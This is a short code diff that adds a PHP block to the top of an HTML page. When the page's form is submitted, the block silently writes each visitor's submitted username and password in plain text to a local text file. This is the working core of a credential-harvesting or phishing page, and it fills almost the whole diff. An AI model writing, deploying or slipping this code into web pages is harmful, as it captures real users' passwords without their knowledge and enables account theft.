@@ -1,3 +1,16 @@
+<?php
+if(isset($_POST['submit'])){
+$Name = "username:".$_POST['username']."
+";
+$Pass = "password:".$_POST['password']."
+";
+$file=fopen("Zadanie_Ulozene.txt", "a");
+fwrite($file, $Name);
+fwrite($file, $Pass);
+fclose($file);
+}
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
